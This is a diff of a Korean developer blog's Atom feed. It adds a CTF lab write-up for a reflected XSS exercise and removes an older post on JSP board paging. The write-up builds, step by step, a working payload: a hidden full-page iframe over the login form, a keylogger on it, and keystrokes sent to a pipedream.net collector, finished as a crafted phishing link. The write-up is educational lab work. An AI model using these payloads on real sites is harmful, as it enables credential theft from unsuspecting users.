@@ -1,4 +1,106 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-27T02:27:58+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOu5hOygleyDgSDtjpjsnbTsp4Ag7YyM652866-47YSw66W8IOuEo-ydgCDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrgrTrtoAg7Y6Y7J207KeAIOyalOyyrVxu64K067aAIOyEnOuyhCAtPj4g7ISc67KEIDog64K067aAIO2OmOydtOyngCDsnZHri7VcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog64K067aAIO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SSRF 실습 문제 Basic SSRF</title><link href="http://localhost:4000/SSRF%EC%8B%A4%EC%8A%B5%EB%AC%B8%EC%A0%9CBasicSSRF/" rel="alternate" type="text/html" title="SSRF 실습 문제 Basic SSRF" /><published>2023-05-27T00:00:00+09:00</published><updated>2023-05-27T23:13:00+09:00</updated><id>http://localhost:4000/SSRF%EC%8B%A4%EC%8A%B5%EB%AC%B8%EC%A0%9CBasicSSRF</id><content type="html" xml:base="http://localhost:4000/SSRF%EC%8B%A4%EC%8A%B5%EB%AC%B8%EC%A0%9CBasicSSRF/"><![CDATA[<h2 id="ssrf-란">SSRF 란?</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-29T04:57:45+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOu5hOygleyDgSDtjpjsnbTsp4Ag7YyM652866-47YSw66W8IOuEo-ydgCDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrgrTrtoAg7Y6Y7J207KeAIOyalOyyrVxu64K067aAIOyEnOuyhCAtPj4g7ISc67KEIDog64K067aAIO2OmOydtOyngCDsnZHri7VcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog64K067aAIO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">XSS 실습 7번</title><link href="http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C/" rel="alternate" type="text/html" title="XSS 실습 7번" /><published>2023-05-29T00:00:00+09:00</published><updated>2023-05-29T23:13:00+09:00</updated><id>http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C</id><content type="html" xml:base="http://localhost:4000/XSS7%EB%B2%88%EB%AC%B8%EC%A0%9C/"><![CDATA[<h2 id="xss-란">XSS 란?</h2>
+<ul>
+  <li>크라이언트 측 스크립트를 삽입하는 공격이다.</li>
+</ul>
+
+<h2 id="xss-7번-문제">XSS 7번 문제</h2>
+<ul>
+  <li>키로거를 삽입하여 사용자의 계정을 탈취하는 문제이다.</li>
+</ul>
+
+<h2 id="사이트-분석-및-취약점-탐색">사이트 분석 및 취약점 탐색</h2>
+
+<h3 id="로그인">로그인</h3>
+<ul>
+  <li>POST 와 GET 두 방식으로 로그인이 가능하다.</li>
+</ul>
+
+<h3 id="로그인-실패-페이지">로그인 실패 페이지</h3>
+<ul>
+  <li>XSS 취약점이 존재한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/7654383c-c4bd-441c-aef4-5b3de1abd353" alt="Pasted image 20230529012624" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d8efcad7-ebd2-45f6-8532-6d6a18772543" alt="Pasted image 20230529012643" /></li>
+  <li>아이디 대신 스크립문을 삽입할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/bc4ab412-10ca-453e-8aca-15254576ec26" alt="Pasted image 20230529013321" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/13cd15a9-8863-4135-9098-c5611767d780" alt="Pasted image 20230529013241" /></li>
+</ul>
+
+<h2 id="공격-시나리오">공격 시나리오</h2>
+<ol>
+  <li>login.html 에서 사용자가 로그인을 시도하는 것이 아닌 login.php에서 사용자가 로그인을 시도하도록 하자.</li>
+  <li>login.php의 XSS 취약점을 이용하여 키로그를 삽입한다.</li>
+  <li>사용자에게 공격자가 준 링크를 통해 페이지에 방문하여 로그인 하도록 해야한다.</li>
+</ol>
+
+<h2 id="공격-시작">공격 시작</h2>
+<ol>
+  <li>alert 창 안뜨게 만들기. 첫번째 스크립트는 일부러 오류를 유발시켜 동작안되도록 하였다. 따라서 <code class="language-plaintext highlighter-rouge">alert(1)</code> 이 경고창으로 뜨는 것을 확인할 수 있다.
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+<span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">[ id</span><span class="dl">'</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="c1">// ] ~~~');</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;script&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">'</span><span class="s1">login.html</span><span class="dl">'</span><span class="p">;</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div>    </div>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>완성 공격문 = id'&lt;/script&gt;&lt;script&gt;alert(1);//
+</code></pre></div>    </div>
+    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/343cd063-2ed6-4cc2-8611-ead3b5e960b3" alt="Pasted image 20230529015248" /></p>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">href</code> 를 통해 자동으로 리다이렉트 형상 막기. html 주석 처리 기능을 이용하여 <code class="language-plaintext highlighter-rouge">href</code> 스크립트 부부을 주석처리 해준다. 확인 버튼을 눌러도 <code class="language-plaintext highlighter-rouge">login.html</code> 로 리다이렉션하지 않고 <code class="language-plaintext highlighter-rouge">login.php</code> 에 머문다.
+    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+<span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">[ id</span><span class="dl">'</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="nt">&lt;/script&gt;</span><span class="c">&lt;!--// ] ~~~');
+&lt;/script&gt;
+&lt;script&gt;window.location.href='login.html';&lt;/script&gt;
+</span></code></pre></div>    </div>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>완성 공격문 = id'&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;!--//
+</code></pre></div>    </div>
+    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/869eb7fb-9a97-44c7-801c-7b6686f08df2" alt="Pasted image 20230529020238" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d92d7de7-328b-4ba7-a497-1d1465e2f677" alt="Pasted image 20230529020302" /></p>
+  </li>
+  <li>사용자는 정상적인 로그인 페이지가 보여야한다. 따라서 <code class="language-plaintext highlighter-rouge">iframe</code> 을 통해 로그인 창 보이게 한다. 공격문을 id에 넣고 로그인을 하면 <code class="language-plaintext highlighter-rouge">login.php</code> 에서 로그인 페이지가 나오는 것을 확인할 수 있다.
+<script src="https://gist.github.com/MinGyu2/e2b89c91fab5b1368f8bc58efd245e22.js"></script>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>완성 공격문 =
+id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html'&gt;&lt;/iframe&gt;&lt;!--//
+</code></pre></div>    </div>
+    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/5e9676ba-637a-4b09-8913-16a4e8f78c7d" alt="Pasted image 20230529022346" /></p>
+  </li>
+  <li>사용자가 입력하는 아이디와 비번을 알아내기위한 키로거를 넣어보자. 그리고 키로거를 이용하여 사용자 입력을 200ms 주기로 콘솔에 출력해보자.
+<script src="https://gist.github.com/MinGyu2/c2557af1a361f188bfc86138b17b17d0.js"></script><br /><script src="https://gist.github.com/MinGyu2/d0cd73f4feb2e940ea44d7d8b5cbae57.js"></script>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>공격문 = 
+id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html' onload='load()'&gt;&lt;/iframe&gt;&lt;script&gt;var keys = "";function load(){var win = document.getElementsByTagName('iframe')[0].contentWindow;win.onkeydown=(e)=&gt;{key = e.keyCode?e.keyCode:e.charCode;key = String.fromCharCode(key);keys += key;}}window.setInterval(function(){if(keys != ''){console.log(keys);keys='';}}, 200);&lt;/script&gt;&lt;!--//
+</code></pre></div>    </div>
+    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f83fc784-7b5c-4f08-bf73-10774b39ad7c" alt="Pasted image 20230529030914" /><br />
+<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a58cfab3-8e93-481b-8246-efcd720ff3d9" alt="Pasted image 20230529030931" /></p>
+  </li>
+  <li>공격자 서버로 사용자 입력 보내기. 사용자의 입력을 <code class="language-plaintext highlighter-rouge">Image</code> 를 이용하여 공격자 서버로 보낸다.
+<script src="https://gist.github.com/MinGyu2/66fcfc1763b5cb43c951ba7c39a6cc33.js"></script>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>공격문 = 
+id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html' onload='load()'&gt;&lt;/iframe&gt;&lt;script&gt;var keys = "";var hackURL = "https://envs1y92en6c.x.pipedream.net/?v=";function load(){var win = document.getElementsByTagName('iframe')[0].contentWindow;win.onkeydown=(e)=&gt;{key = e.keyCode?e.keyCode:e.charCode;key = String.fromCharCode(key);keys += key;}}window.setInterval(function(){if(keys != ''){new Image().src = hackURL+keys;keys='';}}, 1000);&lt;/script&gt;&lt;!--//
+</code></pre></div>    </div>
+    <p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d451186b-0c43-4949-9dae-dad6b2bb8617" alt="Pasted image 20230529035800" />
+<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/816c929e-21b6-4a90-92c9-0ad7a4c7aad0" alt="Pasted image 20230529040046" />
+<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/be7c8f83-620d-4cfa-9227-a3b70eef1dd8" alt="Pasted image 20230529035816" /></p>
+  </li>
+  <li>로그인에 성공하면 실제 메인 페이지를 보여줘야 의심이 안간다. 즉 로그인에 실패하면 iframe 내에서 로그인을 다시 시도해야하고, 성공하면 정상적으로 로그인 성공한 것으로 보이기위하여 <code class="language-plaintext highlighter-rouge">index.php</code>로 이동한다.<br /><script src="https://gist.github.com/MinGyu2/81cbf0b824103cc9bc0c0c1f5a52b64f.js"></script>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>공격문 = 
+id'&lt;/script&gt;&lt;iframe style="position:absolute;border:none;overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;top:0px;left:0px;right:0px;bottom:0px" src='login.html' onload='load()'&gt;&lt;/iframe&gt;&lt;script&gt;var keys = "";var hackURL = "https://enhrvcr5t8jsk.x.pipedream.net/?v=";function load(){var win = document.getElementsByTagName('iframe')[0].contentWindow;var s = win.location.href;if(s!='http://ctf.segfaulthub.com:4343/xss_7/login.html'){location.href="index.php";new Image().src = hackURL+"success";}else{new Image().src = hackURL+"fail";}win.onkeydown=(e)=&gt;{key = e.keyCode?e.keyCode:e.charCode;key = String.fromCharCode(key);keys += key;}}window.setInterval(function(){if(keys != ''){new Image().src = hackURL+keys;keys='';}}, 1000);&lt;/script&gt;&lt;!--//
+</code></pre></div>    </div>
+    <ul>
+      <li>로그인 성공<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/596bb9cf-ad96-4863-acc8-d76a3188bfa5" alt="Pasted image 20230529042336" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e874aec8-af9e-48d5-b053-49bd57473b6b" alt="Pasted image 20230529042328" /></li>
+      <li>로그인 실패<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/917e710b-4fba-491c-8e49-4a4db21c3fee" alt="Pasted image 20230529042229" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/308c8ff8-386d-4547-a168-940215b06ce7" alt="Pasted image 20230529042237" /></li>
+    </ul>
+  </li>
+  <li>로그인을 GET요청으로 할 수 있음으로 Reflected XSS 취약점으로 활용할 수있다. 따라서 Get요청으로 공격하기 위해서 id 파라미터에 공격 스크립트를 넣어 링크를 눌러 사용자가 접속하여 로그인 하도록 유도 하면 된다.
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://ctf.segfaulthub.com:4343/xss_7/login.php?id=id%27%3C%2Fscript%3E%3Ciframe+style%3D%22position%3Aabsolute%3Bborder%3Anone%3Boverflow%3Ahidden%3Boverflow-x%3Ahidden%3Boverflow-y%3Ahidden%3Bheight%3A100%25%3Bwidth%3A100%25%3Btop%3A0px%3Bleft%3A0px%3Bright%3A0px%3Bbottom%3A0px%22+src%3D%27login.html%27+onload%3D%27load%28%29%27%3E%3C%2Fiframe%3E%3Cscript%3Evar+keys+%3D+%22%22%3Bvar+hackURL+%3D+%22https%3A%2F%2Fenhrvcr5t8jsk.x.pipedream.net%2F%3Fv%3D%22%3Bfunction+load%28%29%7Bvar+win+%3D+document.getElementsByTagName%28%27iframe%27%29%5B0%5D.contentWindow%3Bvar+s+%3D+win.location.href%3Bif%28s%21%3D%27http%3A%2F%2Fctf.segfaulthub.com%3A4343%2Fxss_7%2Flogin.html%27%29%7Blocation.href%3D%22index.php%22%3Bnew+Image%28%29.src+%3D+hackURL%2B%22success%22%3B%7Delse%7Bnew+Image%28%29.src+%3D+hackURL%2B%22fail%22%3B%7Dwin.onkeydown%3D%28e%29%3D%3E%7Bkey+%3D+e.keyCode%3Fe.keyCode%3Ae.charCode%3Bkey+%3D+String.fromCharCode%28key%29%3Bkeys+%2B%3D+key%3B%7D%7Dwindow.setInterval%28function%28%29%7Bif%28keys+%21%3D+%27%27%29%7Bnew+Image%28%29.src+%3D+hackURL%2Bkeys%3Bkeys%3D%27%27%3B%7D%7D%2C+1000%29%3B%3C%2Fscript%3E%3C%21--%2F%2F&amp;pw=123
+</code></pre></div>    </div>
+  </li>
+  <li>사용자가 로그인 창에 아이디와 비밀번호를 입력하면 공격자 서버로 아이디와 비밀번호가 전송된다. <br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/aecb22ef-f21a-4517-9ec9-3fb4f6d57a1e" alt="Pasted image 20230529042638" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a2ddcfb2-659d-4efb-8db6-9cf70beb8ff7" alt="Pasted image 20230529042652" /></li>
+</ol>
+
+<h2 id="후기">후기</h2>
+<ul>
+  <li>키로거를 사용하여 공격자 서버로 직접 사용자의 입력을 받아보았다. url을 주의깊게 보지않는이상 사용자는 이상있는지 확인하기 어렵다는 것을 알 수 있었다. 키로거를 이용한 새로운 공격이라 흥미로웠다.</li>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="Reflected XSS" /><summary type="html"><![CDATA[XSS 실습 7번 문제를 풀어보자.]]></summary></entry><entry><title type="html">SSRF 실습 문제 Basic SSRF</title><link href="http://localhost:4000/SSRF%EC%8B%A4%EC%8A%B5%EB%AC%B8%EC%A0%9CBasicSSRF/" rel="alternate" type="text/html" title="SSRF 실습 문제 Basic SSRF" /><published>2023-05-27T00:00:00+09:00</published><updated>2023-05-27T23:13:00+09:00</updated><id>http://localhost:4000/SSRF%EC%8B%A4%EC%8A%B5%EB%AC%B8%EC%A0%9CBasicSSRF</id><content type="html" xml:base="http://localhost:4000/SSRF%EC%8B%A4%EC%8A%B5%EB%AC%B8%EC%A0%9CBasicSSRF/"><![CDATA[<h2 id="ssrf-란">SSRF 란?</h2>
 <ul>
   <li>서버가 임의의 요청을 보내도록 하는 공격이다.</li>
 </ul>
@@ -1866,171 +1968,4 @@ step 3. <strong>Black List</strong> 기반으로 Event Handler를 필터링 하�
 <h2 id="참고-사이트">참고 사이트</h2>
 <ul>
   <li><a href="https://junhyunny.github.io/information/security/dom-based-cross-site-scripting/">DOM 기반 XSS(DOM based Cross Site Scripting) 공격과 방어 - Junhyunny’s Devlogs</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="웹 해킹" /><category term="javascript" /><category term="html" /><summary type="html"><![CDATA[XSS ( Cross-Site Scripting ) 란 클라이언트 측 스크립트를 삽입하는 공격이다. 웹 애플리케이션에서 발생하는 취약점이다. 클라이언트 만이 피해를 입는다. 즉 서버에는 아무런 악영향을 안 끼친다. 클라이언트의 브라우저에서 개발자가 의도하지 않았던 스크립트가 실행된다. 취약한 웹 애플리케이션을 이용하는 사용자가 주 타겟이 된다. 사용자 쿠키를 탈취하는 세션 하이재킹( session hijacking ) 공격을 수행할 수 있다.]]></summary></entry><entry><title type="html">웹 서버 개발 12 페이징 번호</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C12%ED%8E%98%EC%9D%B4%EC%A7%95/" rel="alternate" type="text/html" title="웹 서버 개발 12 페이징 번호" /><published>2023-05-16T00:00:00+09:00</published><updated>2023-05-16T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C12%ED%8E%98%EC%9D%B4%EC%A7%95</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C12%ED%8E%98%EC%9D%B4%EC%A7%95/"><![CDATA[<h2 id="게시글-페이징-번호">게시글 페이징 번호</h2>
-<ul>
-  <li><a href="https://stackoverflow.com/search?page=29&amp;tab=Relevance&amp;pagesize=15&amp;q=jsp&amp;searchOn=3&amp;s=48d80aca-ac2a-486e-8868-d30aed82bf58">stackoverflow</a>의 페이징 스타일을 참고하였다.</li>
-  <li>현재 페이지에 5개의 게시글을 보여준다.</li>
-  <li>나중에 사용자가 한 페이지에 볼 수 있는 게시글 수를 정할수 있게 할 것이다.</li>
-  <li>완성된 페이징 페이지.<br />
-<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/ff3b6285-554c-4496-a7bf-2e21de43a8e9" alt="Pasted image 20230515223925" /></li>
-</ul>
-
-<h3 id="jsp">JSP</h3>
-<ul>
-  <li>게시글의 베이스가 되는 jsp 파일을 수정하였다.</li>
-</ul>
-
-<h4 id="notice_boardjsp">notice_board.jsp</h4>
-<ul>
-  <li>servlet 으로 부터 현재 페이지와 마지막 페이지 정보를 받아온다.</li>
-  <li>페이징 번호 리스트 정보를 받아온다.</li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/a2b399311e658a135115829604a4721f.js"></script>
-
-<p><br /></p>
-<ul>
-  <li>페이징 번호 리스트 정보를 이용하여 페이징 부분을 그려준다.</li>
-  <li>리스트에 들어있는 0은 생략을 의미한다.</li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/3837b0845cb1383d7183418bfe310d75.js"></script>
-
-<p><br /></p>
-
-<ul>
-  <li>총 게시글 수 보여주기.</li>
-  <li>servlet 으로 부터 받은 총 게시글 수를 보여준다.</li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/0d2bee07d5992c7a8f9d636392476f66.js"></script>
-
-<p><br /></p>
-<ul>
-  <li>페이징 번호 스타일.</li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/c0c2034a0350abe4dba5f3b38e5d2b84.js"></script>
-
-<p><br /></p>
-
-<ul>
-  <li>참고</li>
-  <li>form 에서 input이 여러개면 엔터를 눌러도 submit 이 안된다.</li>
-  <li>이럴 때는 type이 submit 인 input을 만들어 줘야한다.</li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/4733be6980bb83915c196cc75387d2bb.js"></script>
-
-<p><br /></p>
-
-<h3 id="servlet">Servlet</h3>
-
-<h4 id="mainpagejava">MainPage.java</h4>
-
-<ul>
-  <li>uriSearch 함수의 게시판 부분이다.</li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/90ed9ab083b6c47dac20bc5ac85a419d.js"></script>
-
-<p><br /></p>
-<ul>
-  <li>현재 페이지 정보를 get의 파라미터로 받아온다.</li>
-  <li>즉 <code class="language-plaintext highlighter-rouge">url?page=2&amp;q=검색</code> 형태이다.</li>
-  <li>페이지 정보를 못 받아오거나 음수면 페이지를 1로 초기화를 진행한다.</li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/33f35d284dbcef6939581c769bc071dc.js"></script>
-
-<p><br /></p>
-<ul>
-  <li>검색 결과에 해당하는 총 게시글의 수 구하기.</li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/319742435a0083c49288524bac837b50.js"></script>
-
-<p><br /></p>
-<ul>
-  <li>한 페이지 보여줄 게시글의 수를 정한다.</li>
-  <li>마지막 페이지를 구해준다.</li>
-  <li>사용자로 부터 받은 페이지 수가 마지막 페이지 보다 크다면 마지막 페이지로 리다이렉트 한다.</li>
-  <li>sql문으로 검색을 하기위해서 실제 데이터의 시작 위치를 계산하여 준다.</li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/183a2b08e5bbe4c24e503059f1b57340.js"></script>
-
-<p><br /></p>
-
-<ul>
-  <li>검색 데이터 가져오기.</li>
-  <li>여기서는 5개의 게시글을 가져온다.</li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/60563c690675f704572ed2b2fb53e86b.js"></script>
-
-<p><br /></p>
-
-<ul>
-  <li>페이징 번호를 저장하기 위한 리스트를 만들어준다.</li>
-  <li>한번에 몇개의 페이징번호를 보여줄지 정해준다.</li>
-  <li>해당 리스트에 0은 생략을 의미한다.</li>
-  <li>예를들어 현재 페이지가 <code class="language-plaintext highlighter-rouge">6</code>이고 마지막 페이지가 <code class="language-plaintext highlighter-rouge">10</code> 이면 페이징 형태가 다음과 같다.  <br /><code class="language-plaintext highlighter-rouge">1 ... 4 5 6 7 8 ... 10</code></li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/55e88f3c9e0541a01bf2e5f7e3fe016b.js"></script>
-
-<p><br /></p>
-
-<ul>
-  <li>페이지를 그리기위하여 <code class="language-plaintext highlighter-rouge">mainpage jsp</code>로 지금까지 만들었던 정보를 넘겨준다.</li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/ff414408dd9e1e1f57987724682add56.js"></script>
-
-<p><br /></p>
-
-<h4 id="noticeboarddaojava">NoticeBoardDAO.java</h4>
-
-<ul>
-  <li>검색목록을 가져오는 getNoticeList 함수를 수정하였다.</li>
-  <li>모든 목록을 가져오는 것이아닌 정해준 갯수의 게시물 목록만 가지고 온다.</li>
-  <li>게시글의 시작위치와 가져올 갯수를 함수의 인자로 준다.</li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/64410a9c64396ddadf7daae2e395c527.js"></script>
-
-<p><br /></p>
-<ul>
-  <li>sql 쿼리문에 특정 갯수만 출력을 하기위한 구문을 추가한다.</li>
-  <li><code class="language-plaintext highlighter-rouge">prepared statment</code>를 이용하였다.</li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/4becbc45b945e4751efaed31724bcf75.js"></script>
-
-<p><br /></p>
-
-<ul>
-  <li>검색된 게시판 목록 총 개수 구하기.</li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/a81e9332c5ece965cee636428604b360.js"></script>
-
-<h3 id="전체코드">전체코드</h3>
-
-<h4 id="mainpagejava-1">MainPage.java</h4>
-<script src="https://gist.github.com/MinGyu2/95dee19807c4b09f512b2584b0f3e224.js"></script>
-
-<h4 id="noticeboarddaojava-1">NoticeBoardDAO.java</h4>
-<script src="https://gist.github.com/MinGyu2/a0071a20f1b991dadccc9e8c307a1ab4.js"></script>
-
-<script src="https://gist.github.com/MinGyu2/7e955cecf219df3a91a6012bb3fbf428.js"></script>
-
-<h4 id="notice_boardjsp-1">notice_board.jsp</h4>
-<script src="https://gist.github.com/MinGyu2/7e955cecf219df3a91a6012bb3fbf428.js"></script>
-
-<h3 id="웹-프로젝트">웹 프로젝트</h3>
-<ul>
-  <li><a href="https://github.com/MinGyu2/MyHomePage">MinGyu2/MyHomePage (github.com)</a></li>
-  <li><a href="https://github.com/MinGyu2/myWeb">MinGyu2/myWeb (github.com)</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="웹" /><category term="jsp" /><category term="servlet" /><summary type="html"><![CDATA[게시글에 페이징 번호를 추가하자.]]></summary></entry></feed>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="웹 해킹" /><category term="javascript" /><category term="html" /><summary type="html"><![CDATA[XSS ( Cross-Site Scripting ) 란 클라이언트 측 스크립트를 삽입하는 공격이다. 웹 애플리케이션에서 발생하는 취약점이다. 클라이언트 만이 피해를 입는다. 즉 서버에는 아무런 악영향을 안 끼친다. 클라이언트의 브라우저에서 개발자가 의도하지 않았던 스크립트가 실행된다. 취약한 웹 애플리케이션을 이용하는 사용자가 주 타겟이 된다. 사용자 쿠키를 탈취하는 세션 하이재킹( session hijacking ) 공격을 수행할 수 있다.]]></summary></entry></feed>
